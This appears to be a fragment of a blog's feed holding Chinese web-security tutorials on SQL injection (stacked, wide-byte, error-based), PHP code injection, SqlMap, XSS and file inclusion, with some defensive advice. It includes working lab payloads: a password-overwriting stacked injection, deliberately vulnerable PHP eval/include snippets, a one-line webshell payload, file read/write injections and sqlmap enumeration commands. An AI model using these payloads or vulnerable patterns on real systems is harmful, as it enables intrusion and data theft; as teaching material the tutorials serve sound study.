+    <content type="html"><![CDATA[<h2 id="堆叠注入（Stacked-Injections）"><a href="#堆叠注入（Stacked-Injections）" class="headerlink" title="堆叠注入（Stacked Injections）"></a>堆叠注入（Stacked Injections）</h2><p>一堆SQL 语句(多条)一起执行。</p><p>在MySQL 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们<br>就想到了是不是可以多句一起使用。</p><p><code>堆叠注入和union injection（联合注入）有什么区别？</code><br>union injection是有限的，受到前面一个查询的影响。而堆叠注入不影响</p><p>但是堆叠注入本身也有<code>局限性</code>：</p><p>并不是每一个环境下都可以执行，很可能受到API或者数据库引擎不支持的限<br>制，同时权限不足也是面临的主要问题。</p><p>真实环境中：通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结<br>果只能被忽略，我们在前端界面是无法看到返回结果的</p><h3 id="相关API"><a href="#相关API" class="headerlink" title="相关API"></a>相关API</h3><p>mysqli_multi_query 及mysqli_use_result</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:81/vulnerabilities/sqli/?id=1&#x27;; update users set password=e10adc3949ba59abbe56e057f20f883e&#x27; where user_id=1; -- &amp;Submit=Submit#</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用堆叠注入，对admin账户的password进行更新。</span></span><br></pre></td></tr></table></figure><h2 id="OOB注入-带外通道技术（Out-Of-Band）"><a href="#OOB注入-带外通道技术（Out-Of-Band）" class="headerlink" title="OOB注入-带外通道技术（Out-Of-Band）"></a>OOB注入-带外通道技术（Out-Of-Band）</h2><p>带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回<br>显的漏洞。</p><p>这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结<br>果。</p><p>带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，<br>攻击者可以通过这个请求来提取数据。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在数据库使用了宽字符集而web中没有考虑这个问题。<code>character_set_client</code>（客户端的字符集）和<code>character_set_connection</code>（连接层的字符集）不同，或转换函数如iconv、mb_convert_encoding使用不当</p><p>当存在宽字节注入的时候，注入参数里带入<code>%DF</code>,即可把<code>\（%5C）</code>吃掉,，让<code>&#39;</code>重新出现</p><p>比如对以下url进行注入</p><p><code>http://ip/test/index.php?id=1</code></p><p>当提交，<code>id=1&#39; and 1=1%23</code></p><p>mysql运行的SQL语句为</p><p><code>select * from user where id = &#39;1\&#39; and 1=1#&#39;</code></p><p>很明显没有注入成功，而当我们提交,<code>id=1%df&#39; and 1=1%23</code></p><p>mysql运行的SQL语句为</p><p><code>select * from user where id = &#39;1䞫&#39; and 1=1#&#39;</code></p><p>我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>统一数据库，web应用的字符集，避免解析产生差异。或者使用mysql_real_escape_string和mysql_set_charset，对数据进行正确的转义。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;堆叠注入（Stacked-Injections）&quot;&gt;&lt;a href=&quot;#堆叠注入（Stacked-Injections）&quot; class=&quot;headerlink&quot; title=&quot;堆叠注入（Stacked Injections）&quot;&gt;&lt;/a&gt;堆叠注入（Stacked I</summary>
+      
+    
+    
+    
+    
+    <category term="堆叠注入、OOB注入" scheme="http://yejuns.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之php代码注入</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-30T09:18:13.392Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="PHP代码注入"><a href="#PHP代码注入" class="headerlink" title="PHP代码注入"></a>PHP代码注入</h2><p>代码执行（注入）类似SQL 注入漏洞，SQL注入 是将SQL 语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web 后门的存在。</p><h3 id="存在的原因"><a href="#存在的原因" class="headerlink" title="存在的原因"></a>存在的原因</h3><ol><li>程序中含有可以执行PHP 代码的函数或者语言结构</li><li>传入第一点中的参数，客户端可控，直接修改或者影响</li></ol><h3 id="相关函数和语句"><a href="#相关函数和语句" class="headerlink" title="相关函数和语句"></a>相关函数和语句</h3><ul><li><p>eval()</p><p>  测试代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="variable">$str</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交变量?code=phpinfo();或者?code=${phpinfo()};或者?code=1;phpinfo();</p></li><li><p>assert()</p></li></ul><p>assert() 同样会作为PHP 代码执行</p><p>其他的跟eval()类似</p><ul><li><p>preg_replace()</p><p>preg_replace() 函数作用是对字符串进行正则处理,</p><p><code>preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &amp;$count]])</code></p><p>搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换，而$pattern处，及第一个参数存在e 修饰时，$replacement 的值会被当成PHP 代码来执行</p></li><li><p>call_user_func()</p><p>call_user_func() 等函数都有调用其他函数的功能，其中一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用以外的函数来执行我们想要的代码，也就是存在任意代码执行漏洞</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$fun</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line">        <span class="variable">$para</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;para&#x27;</span>];</span><br><span class="line">        call_user_func(<span class="variable">$fun</span>,<span class="variable">$para</span>); </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交参数<code>?fun=assert&amp;amp;para=phpinfo()</code></p><ul><li><p>动态函数$a($b)</p><p>由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这导致PHP 再安全上的控制又加大了难度。不少知名程序也用到了动态函数的写法，这种写法跟使用call_user_func() 的初衷一样，用来更加方便的调用函数，但是一旦过滤不严格就会造成代码执行漏洞</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交参数<code>?a=assert$b=phpinfo()</code></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li><p>直接获取shell</p><p>提交参数[?code=@eval($_REQUEST[1])],即可构成一句话木马，密码为[1]。可以使用菜刀连接</p></li><li><p>获取当前文件的绝对路径</p><p><code>__FILE__</code> 是PHP 预定义常量，其含义为当前文件的路径。提交代码?code=print(<code>__FILE__</code>);</p></li><li><p>读文件</p><p>可以利用file_get_contents() 函数读取服务器任意文件，前提是知道文件的绝对路径(也可是相对路径)和读取权限。比如，<code>?code=var_dump(file_get_contents(&#39;c:\windows\system32\drivers\etc\hosts&#39;));</code></p></li><li><p>写文件</p><p>可以利用file_put_contents() 函数写入文件，前提是知道可写文件目录,比如</p><p><code>?code=var_dump(file_put_contents($_POST[1],$_POST[2]));</code></p><p>同时需要通过post方式提交参数<br><code>1=shel.php&amp;2=&lt;?php phpinfo()?&gt;</code></p></li></ol><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>尽量不要使用eval(不是函数，是语言结构) 等函数</p></li><li><p>如果使用的话一定要进行严格的过滤</p></li><li><p>preg_replace 放弃使用/e 修饰符</p></li><li><p>修改配置文件</p><p> disable_functions=assert</p></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;PHP代码注入&quot;&gt;&lt;a href=&quot;#PHP代码注入&quot; class=&quot;headerlink&quot; title=&quot;PHP代码注入&quot;&gt;&lt;/a&gt;PHP代码注入&lt;/h2&gt;&lt;p&gt;代码执行（注入）类似SQL 注入漏洞，SQL注入 是将SQL 语句注入到数据库中执行，而代码执行则是</summary>
+      
+    
+    
+    
+    
+    <category term="web、php、注入、RCE" scheme="http://yejuns.github.io/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之SQL注入-报错注入</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-07T08:21:50.885Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="报错注入（Error-based-Injection）"><a href="#报错注入（Error-based-Injection）" class="headerlink" title="报错注入（Error based Injection）"></a>报错注入（Error based Injection）</h2><p>一种SQL注入的类型，用于使SQL 语句报错的语法，用于注入结果无回显<br>但错误信息有输出的情况。返回的错误信息即是攻击者需要的信息。</p><h3 id="MySQL报错注入主要分为以下几类"><a href="#MySQL报错注入主要分为以下几类" class="headerlink" title="MySQL报错注入主要分为以下几类"></a>MySQL报错注入主要分为以下几类</h3><ol><li>BigInt 等数据类型溢出；</li><li>Xpath 语法错误；</li><li>count() + rand() + group_by() 导致重复；</li><li>空间数据类型函数错误。</li></ol><h3 id="会导致MySQL报错的函数"><a href="#会导致MySQL报错的函数" class="headerlink" title="会导致MySQL报错的函数"></a>会导致MySQL报错的函数</h3><ol><li>floor 函数；</li><li>extractvalue 函数；（最多32字符）</li><li>updatexml 函数；</li><li>exp() 函数；</li></ol><h3 id="常用构造注入方法"><a href="#常用构造注入方法" class="headerlink" title="常用构造注入方法"></a>常用构造注入方法</h3><p>使用union语句，<code>select 1,2 union select 1,2</code></p><h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;报错注入（Error-based-Injection）&quot;&gt;&lt;a href=&quot;#报错注入（Error-based-Injection）&quot; class=&quot;headerlink&quot; title=&quot;报错注入（Error based Injection）&quot;&gt;&lt;/a&gt;报错注入（</summary>
+      
+    
+    
+    
+    
+    <category term="SQL注入" scheme="http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之SqlMap</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSqlMap%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSqlMap%E4%BD%BF%E7%94%A8/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-21T11:18:11.338Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SqlMap"><a href="#SqlMap" class="headerlink" title="SqlMap"></a>SqlMap</h2><p>SqlMap是一个开源的测试渗透工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 </p><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">基本格式，默认使用level 1，检测全部数据库类型</span></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; -f --banner --dbs --users</span><br><span class="line"><span class="meta">#</span><span class="bash"> -f表示获取对应的指纹信息（fingerPrint），--banner表示数据库的banner信息，--dbs获取对应的数据库信息，--users获取用户信息</span></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3</span><br><span class="line"><span class="meta">#</span><span class="bash">指定数据库类型是mysql，检测级别为3（共5级，级别越高，检测越全面）</span></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --cookie &quot;id=1&quot; --level 2</span><br><span class="line"><span class="meta">#</span><span class="bash">当程序有防get注入的时候，使用cookie注入。（只有level2以上才会检测cookie）</span></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test --tables</span><br><span class="line"><span class="meta">#</span><span class="bash">查询<span class="built_in">test</span>数据库下有哪些表</span></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test -T admin --columns</span><br><span class="line"><span class="meta">#</span><span class="bash">查询<span class="built_in">test</span>数据库、admin表有哪些字段</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><ul><li><p>level      <br/><br> level是注入测试等级，一共有5级。级别越高，检测的内容也就越多。检测级别大于等于2的时候会检测cookie的注入，检测级别大于等于3的时候会检测User-Agent和Referer是否有注入。</p><p>  risk参数是风险等级 等级越高测试的语句越多比如会测试UPDATE 等等对数据库进行操作. </p></li></ul><ul><li><p>*指定注入点    <br/><br>sqlmap可以自动找到URL里的参数，从而确定注入点。但在遇到一些做了伪静态的网页就无法自动识别。</p><p><code>/admin/1/</code>类似这种，SQLMap就无法进行注入测试，但它实际上可能是这样的：<br><code>/admin.php?id=1</code>,它是把参数隐藏在了URL中，对于这样URL，直接在参数后面加一个*就可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;www.baidu.com/admin/1*&quot;</span><br></pre></td></tr></table></figure></li><li><p>POST数据      <br/><br>在 URL后跟上你要提交的POST数据，SQLMap 也会去自动测试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://baidu.com/admin.php&quot; --data=&quot;id=1&amp;name=admin&quot;</span><br></pre></td></tr></table></figure></li><li><p>从文件载入HTTP请求测试  <br/><br><code>使用参数：-r</code></p><p>可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。</p><p>可以从 burpsuite 上抓包下来配合 SQLMap 进行联合使用。</p></li><li><p>Google搜索进行测试  <br/></p></li><li><p>注入测试的脚本 <br/><br><code>使用参数：-tamper</code></p><p>WAF的存在，会有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。</p><p>而SQLMap自带了一个脚本库（在tamper目录下），内置的脚本库对 payload 进行了混淆，使得可以有效地规避防火墙规则</p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SqlMap&quot;&gt;&lt;a href=&quot;#SqlMap&quot; class=&quot;headerlink&quot; title=&quot;SqlMap&quot;&gt;&lt;/a&gt;SqlMap&lt;/h2&gt;&lt;p&gt;SqlMap是一个开源的测试渗透工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 &lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="SqlMap" scheme="http://yejuns.github.io/tags/SqlMap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web漏洞</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%94%BB%E5%87%BB/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%94%BB%E5%87%BB/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-29T03:24:36.211Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><p>xss攻击可以分成3类，</p><ul><li><ol><li>反射型XSS</li></ol></li><li><ol start="2"><li>存储型XSS</li></ol></li><li><ol start="3"><li>DOM型XSS</li></ol></li></ul><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>非持久化的，用户必须点击带有特定参数的链接才可以生效，<br>影响范围小，只影响执行脚本的用户<br>比如对于一个未检测xss的文本框，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;点击开始修复&quot;)；location.href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss是指应用程序通过web请求获取到不可信赖的数据，在未校验是否有xss的情况下就存入数据库。当下一次从数据库中获取该程序时也未对其进行过滤，页面再次执行xss。<br>存储型xss可以持续攻击用户。<br>存储型xss出现的位置包括，<code>留言板、评论区、用户头像、签名、博客</code></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM型XSS其实是一种特殊的反射型XSS，通过JS操作DOM树动态地输出数据到页面，而不依赖将数据提交给服务器端。，最常使用的函数是document.url，document.location，document.referere. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">document.write(&quot;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alter(0)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>反射型XSS会经过后端语言，是页面引用后端输出生效。而DOM型XSS是经过JS对DOM树直接操作后插入到页面。所以不经过<code>WAF的检测</code>.</p><h2 id="突变型XSS（mXSS）"><a href="#突变型XSS（mXSS）" class="headerlink" title="突变型XSS（mXSS）"></a>突变型XSS（mXSS）</h2><p>攻击者的输入看似安全，但是在浏览器解析标记时发生突变。（与浏览器有关）</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;xss攻击&quot;&gt;&lt;a href=&quot;#xss攻击&quot; class=&quot;headerlink&quot; title=&quot;xss攻击&quot;&gt;&lt;/a&gt;xss攻击&lt;/h2&gt;&lt;p&gt;xss攻击可以分成3类，&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;ol&gt;
+&lt;li&gt;反射型XSS&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;</summary>
+      
+    
+    
+    
+    
+    <category term="xss、攻击" scheme="http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之XSS蠕虫</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-28T07:42:23.545Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><p>一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安<br>全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。</p><h3 id="XSS蠕虫一般原理"><a href="#XSS蠕虫一般原理" class="headerlink" title="XSS蠕虫一般原理"></a>XSS蠕虫一般原理</h3><ol><li>基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。</li><li>发送伪装的邀请链接。</li><li>用户点击链接被感染。</li><li>新感染用户的向好友发送伪装的邀请链接。</li></ol><h2 id="Samy-蠕虫"><a href="#Samy-蠕虫" class="headerlink" title="Samy 蠕虫"></a>Samy 蠕虫</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;xss蠕虫&quot;&gt;&lt;a href=&quot;#xss蠕虫&quot; class=&quot;headerlink&quot; title=&quot;xss蠕虫&quot;&gt;&lt;/a&gt;xss蠕虫&lt;/h2&gt;&lt;p&gt;一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安&lt;br&gt;全限制，XSS 蠕虫基于社会工程学诱</summary>
+      
+    
+    
+    
+    
+    <category term="xss、攻击、蠕虫" scheme="http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之XSS模版注入</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-25T02:44:05.229Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="模版引擎"><a href="#模版引擎" class="headerlink" title="模版引擎"></a>模版引擎</h3><p>模版引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，比如常用的Pug模版引擎</p><p>模版引擎便于数据与代码分离， 提供了转义功能。天生具有对XSS的防御效果。但是实际上产生了另一种问题。模版注入</p><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>服务端接受用户的输入，并将其作为Web 应用模板的一部分，即允许修改底层模板，在渲染过程中模板引擎执行用户插入的恶意内容。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;模版引擎&quot;&gt;&lt;a href=&quot;#模版引擎&quot; class=&quot;headerlink&quot; title=&quot;模版引擎&quot;&gt;&lt;/a&gt;模版引擎&lt;/h3&gt;&lt;p&gt;模版引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，比如常用的Pug模版引擎&lt;/p&gt;
+&lt;p&gt;模版引擎便于</summary>
+      
+    
+    
+    
+    
+    <category term="xss、攻击、蠕虫" scheme="http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之伪协议与文包含件</title>
+    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-23T15:47:13.482Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。</p><p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞</p><p>php中常见的文件包含函数，<code>include(), include_once() , require_once() , fopen() , readfile()</code></p><ol><li><p>本地包含:可以进行一些本地的文件读取</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 如上述例子 在引用filename函数时,没有过滤，直接引用了这个函数,如果fileName这个文件是一句话木马，就会被执行</span></span><br></pre></td></tr></table></figure><p> 如果导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的</p></li><li><p>远程包含:可以对外网上的文件进行读取</p><p>要保证php.ini中allow_url_fopen和allow_url_include要为On，也就是打开状态，这就要引入<code>伪协议</code>的概念</p></li></ol><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file伪协议，通过这个协议可以对系统中的文件进行包含，"><a href="#file伪协议，通过这个协议可以对系统中的文件进行包含，" class="headerlink" title="file伪协议，通过这个协议可以对系统中的文件进行包含，"></a>file伪协议，通过这个协议可以对系统中的文件进行包含，</h3><ul><li><p>条件:</p><p>  allow_url_fopen:off/on</p><p>  allow_url_include :off/on</p></li><li><p>示例：</p><ol><li>file://[文件的绝对路径和文件名]<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span></span><br></pre></td></tr></table></figure></li><li>[文件的相对路径和文件名]<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=./phpinfo.txt</span></span><br></pre></td></tr></table></figure></li><li>[http：//网络路径和文件名]<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" 